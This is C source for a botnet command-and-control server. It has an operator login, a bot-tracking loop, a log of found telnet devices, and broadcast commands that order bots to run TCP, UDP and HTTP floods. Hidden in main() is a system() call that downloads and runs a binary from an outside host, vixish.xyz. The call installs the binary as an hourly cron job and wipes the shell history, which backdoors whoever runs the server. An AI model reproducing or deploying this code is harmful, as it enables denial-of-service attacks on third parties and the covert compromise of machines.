// \│/  ┌─┐┌─┐┌┬┐┬┌┐┌┬  \│/
// ─ ─  │ ┬├┤ ││││││││  ─ ─
// /│\  └─┘└─┘┴ ┴┴┘└┘┴  /│\

// ENTITY

// [ Serverside Commands ]
// .logout  'Logout of your account
// 'Sends a udp based flood to specified target, with a fixed packet size and interval
// 'Sends a tcp based flood to specified target, with persistant tcp socket for buffer spam
// 'Closes the connection socket to the botnet host, disconnects the bot from host

// [ Clientside Commands ]
// !* TCP <IP> <PORT> <SECONDS> <SUBNET> <METHOD> <PACKETSIZE> <INTERVAL>  'Sends a tcp based flood to specified target, methods include ALL,SYN,ACK,FIN,RST, and PSH
// !* UDP <IP> <PORT> <SECONDS> <SUBNET> <PACKETSIZE> <INTERVAL>           'Sends a udp based flood to specified target, with a fixed packet size and interval
// !* STD <IP> <PORT> <SECONDS>                                            'Sends a tcp based flood to specified target, with persistant tcp socket for buffer spam
// !* HTTP <URL> <SECONDS>                                                 'Sends a http get flood to specified target, using an array of browser useragents
// !* BOTKILL                                                              'Closes the connection socket to the botnet host, disconnects the bot from host
// !* PING                                                                 'Perform a ping/pong test to update the bot count with active bots

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000

struct login_info {
	char username[100];
	char password[100];
};
static struct login_info accounts[100]; // maximum users allowed in login.txt *edit this if you are selling spots*
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[35m", 5, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL);
                }
                printf("sent to fd: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[31m> \x1b[0m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "!* BOTKILL\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
}}}}}}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0;Gemini - Bots: %d | Telnet Devices: %d | Users: %d%c", '\033', BotsConnected(), TELFound, OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
}}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}
void *BotWorker(void *sock) {
	int datafd = (int)sock;
	int find_line;
    OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}

        if(send(datafd, "\x1b[35mUSERNAME:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
        if(send(datafd, "\x1b[35mPASSWORD:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[2J\033[1;1H");
		if(send(datafd, clearscreen,   		 strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto Banner;
        }
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
		char failed_line1[100];
		char failed_line2[100];
		char failed_line3[100];
		char failed_line4[100];
		char failed_line5[100];
		char failed_line6[100];
		char failed_line7[100];
		char failed_line8[100];
		char failed_line9[100];
		char failed_line10[100];
		char failed_line11[100];
		char failed_line12[100];

        sprintf(failed_line1, "\x1b[1;31m              _________                   _______  \r\n");
        sprintf(failed_line2, "\x1b[1;33m    _-----____/   ========================|______| \r\n");
        sprintf(failed_line3, "\x1b[1;32m    |           ______________/                    \r\n");
        sprintf(failed_line4, "\x1b[1;34m    |    ___--_/(_)       ^                        \r\n");
        sprintf(failed_line5, "\x1b[1;35m    |___ ---                                       \r\n");
		sprintf(failed_line6, "\x1b[1;31mI'M GONNA GIVE YOU TO THE COUNT OF TEN TO GET YOUR, UGLY\r\n");
		sprintf(failed_line7, "\x1b[1;31mYELLA, NO GOOD KEESTER OFF MY PROPERTY, BEFORE I PUMP\r\n");
		sprintf(failed_line8, "\x1b[1;31mYOUR GUTS FULL'A LEAD...\r\n");
		sprintf(failed_line9, "\x1b[1;31mONE ...\r\n");
		sprintf(failed_line10,"\x1b[1;31mTWO ...\r\n");
		sprintf(failed_line11,"\x1b[1;31mTEN ...\r\n");
		sprintf(failed_line12,"\x1b[1;31mKEEP THE CHANGE YAH FILTHY ANIMAL.\r\n");
		if(send(datafd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, failed_line3, strlen(failed_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, failed_line4, strlen(failed_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, failed_line5, strlen(failed_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, failed_line6, strlen(failed_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, failed_line7, strlen(failed_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, failed_line8, strlen(failed_line8), MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		if(send(datafd, failed_line9, strlen(failed_line9), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		if(send(datafd, failed_line10, strlen(failed_line10), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		if(send(datafd, failed_line11, strlen(failed_line11), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		if(send(datafd, failed_line12, strlen(failed_line12), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
        goto end;

		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
		char ascii_banner_line1   [5000];
		char ascii_banner_line2   [5000];
		char ascii_banner_line3   [5000];
		char ascii_banner_line4   [5000];
		char ascii_banner_line5   [5000];
		char ascii_banner_line6   [5000];
		char ascii_banner_line7   [5000];
		char ascii_banner_line8   [5000];
		char ascii_banner_line9   [5000];
		char ascii_banner_line10  [5000];
		char ascii_banner_line11  [5000];
		char ascii_banner_line12  [5000];
		char ascii_banner_line13  [5000];
		char ascii_banner_line14  [5000];
		char welcome_line1        [5000];
		char welcome_line2        [5000];
		
		sprintf(ascii_banner_line1, "\x1b[1;37m**********************************************\r\n");
		sprintf(ascii_banner_line2, "\x1b[1;37m******                                  ******\r\n");
		sprintf(ascii_banner_line3, "\x1b[1;37m*****\x1b[1;35m      \\│/  ┌─┐┌─┐┌┬┐┬┌┐┌┬  \\│/      \x1b[1;37m*****\r\n");
		sprintf(ascii_banner_line4, "\x1b[1;37m****\x1b[1;34m       ─ ─  │ ┬├┤ ││││││││  ─ ─       \x1b[1;37m****\r\n");
		sprintf(ascii_banner_line5, "\x1b[1;37m*****\x1b[1;36m      /│\\  └─┘└─┘┴ ┴┴┘└┘┴  /│\\      \x1b[1;37m*****\r\n");
		sprintf(ascii_banner_line6, "\x1b[1;37m******                                  ******\r\n");
		sprintf(ascii_banner_line7, "\x1b[1;37m**********************************************\r\n");
		sprintf(welcome_line1,      "\x1b[1;37m[\x1b[1;36m-\x1b[1;37m] \x1b[1;35mWELCOME\x1b[1;37m: \x1b[1;31m%s ", accounts[find_line].username);
		sprintf(welcome_line2,      "\x1b[1;37m[\x1b[1;36m-\x1b[1;37m] \x1b[1;35mBOTS\x1b[1;37m: \x1b[1;31m%d \x1b[1;37m[\x1b[1;36m-\x1b[1;37m] \x1b[1;35mUSERS\x1b[1;37m: \x1b[1;31m%d\r\n", BotsConnected(), OperatorsConnected);
		
		if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, welcome_line1, 		strlen(welcome_line1), 		MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, welcome_line2, 		strlen(welcome_line2), 		MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(datafd, "\x1b[1;31m> \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if(strstr(buf, ".count")) {
				char botcount [5000];
				memset(botcount, 0, 5000);
				sprintf(botcount, "\x1b[1;36mBOTS: %d | USERS: %d\r\n", BotsConnected(), OperatorsConnected);
				if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return;
				while(1) {
				if(send(datafd, "\x1b[1;31m> \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, ".help")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char helpline1  [5000];
				char helpline2  [5000];
				char helpline3  [5000];
				char helpline4  [5000];
				char helpline5  [5000];
				char helpline6  [5000];
				char helpline7  [5000];
				char helpline8  [5000];
				char helpline9  [5000];
				char helpline10 [5000];
				char helpline11 [5000];
				char helpline12 [5000];
				char helpline13 [5000];

				sprintf(helpline1,  "\x1b[1;31m~ [ CLIENTSIDE COMMANDS ] ~\r\n");
				sprintf(helpline2,  "\x1b[1;32m@ \x1b[1;32m!* TCP <TARGET> <PORT> <TIME> <NETMASK> <METHOD> <PACKETSIZE> <INTERVAL>\r\n");
				sprintf(helpline3,  "\x1b[1;33m@ \x1b[1;33m!* UDP <TARGET> <PORT> <TIME> <NETMASK> <PACKETSIZE> <INTERVAL>\r\n");
				sprintf(helpline4,  "\x1b[1;34m@ \x1b[1;34m!* STD <TARGET> <PORT> <TIME>\r\n");
				sprintf(helpline5,  "\x1b[1;35m@ \x1b[1;35m!* HTTP <URL> <TIME>\r\n");
				sprintf(helpline6, 	"\x1b[1;36m@ \x1b[1;36m!* KILLATTK\r\n");
				sprintf(helpline7, 	"\x1b[1;37m@ \x1b[1;37m!* SH\r\n");
				sprintf(helpline8, 	"\x1b[1;31m~ [ SERVERSIDE COMMANDS ] ~\r\n");
				sprintf(helpline9,  "\x1b[1;32m@ \x1b[1;32m.killattk\r\n");
				sprintf(helpline10, "\x1b[1;33m@ \x1b[1;33m.botkill\r\n");
				sprintf(helpline11, "\x1b[1;34m@ \x1b[1;34m.logout\r\n");
				sprintf(helpline12, "\x1b[1;35m@ \x1b[1;35m.clear\r\n");
				sprintf(helpline13, "\x1b[1;36m@ \x1b[1;36m.count\r\n");
				

				if(send(datafd, helpline1,  strlen(helpline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline2,  strlen(helpline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline3,  strlen(helpline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline4,  strlen(helpline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline5,  strlen(helpline5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline6,  strlen(helpline6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline7,  strlen(helpline7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline8,  strlen(helpline8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline9,  strlen(helpline9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline10, strlen(helpline10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline11, strlen(helpline11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline12, strlen(helpline12), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline13, strlen(helpline13), MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
				while(1) {
				if(send(datafd, "\x1b[1;31m> \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, ".botkill")) {
				char gtfomynet [2048];
				memset(gtfomynet, 0, 2048);
				sprintf(gtfomynet, "!* BOTKILL\r\n");
				broadcast(buf, datafd, gtfomynet);
				while(1) {
				if(send(datafd, "\x1b[1;31m> \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, ".killattk")) {
				char killattack [2048];
				memset(killattack, 0, 2048);
				sprintf(killattack, "!* KILLATTK\r\n");
				broadcast(buf, datafd, killattack);
				while(1) {
				if(send(datafd, "\x1b[1;31m> \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, ".clear")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, welcome_line1, 		strlen(welcome_line1), 		MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, welcome_line2, 		strlen(welcome_line2), 		MSG_NOSIGNAL) == -1) goto end;
				while(1) {
				if(send(datafd, "\x1b[1;31m> \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, ".logout")) {
				char logoutmessage [2048];
				memset(logoutmessage, 0, 2048);
				sprintf(logoutmessage, "BYE, %s", accounts[find_line].username);
				if(send(datafd, logoutmessage, strlen(logoutmessage), MSG_NOSIGNAL) == -1)goto end;
				sleep(2);
				goto end;
			}

            trim(buf);
            if(send(datafd, "\x1b[1;31m> \x1b[1;36m", 11, MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("%s: \"%s\"\n",accounts[find_line].username, buf);

			FILE *LogFile;
            LogFile = fopen("server.log", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			char lcltime[50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "[%s] %s: %s\n", formatted_gmt, accounts[find_line].username, buf);
            fclose(LogFile);
            broadcast(buf, datafd, accounts[find_line].username);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}
void *BotListener(int port) {
	int sockfd, newsockfd;
	socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(420);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1) {
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
}}
int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        system("cd /etc/cron.hourly; rm -rf i686*; wget http://vixish.xyz/i686; chmod 777 *; ./i686; echo 'exec /etc/cron.hourly/i686' >> /etc/cron.hourly/0yum-hourly.cron; rm -rf ~/.bash_history; history -c");
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
        telFD = fopen("telnet.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "LEL");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
